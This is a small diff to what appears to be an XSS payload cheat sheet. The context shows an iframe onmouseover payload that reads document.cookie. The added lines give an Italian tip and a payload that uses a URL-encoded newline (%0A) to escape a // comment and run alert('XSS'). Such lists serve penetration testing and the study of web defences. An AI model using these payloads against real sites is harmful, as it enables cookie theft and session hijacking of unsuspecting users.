@@ -6,7 +6,8 @@
 
 `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`
 
-``
+<i>%0A newline url encoded per mandare a capo il tuo payload. In caso ci sia un commento // %0Aalert(1) </i></br>
+`a%0Aalert('XSS');//`
 
 ``
 
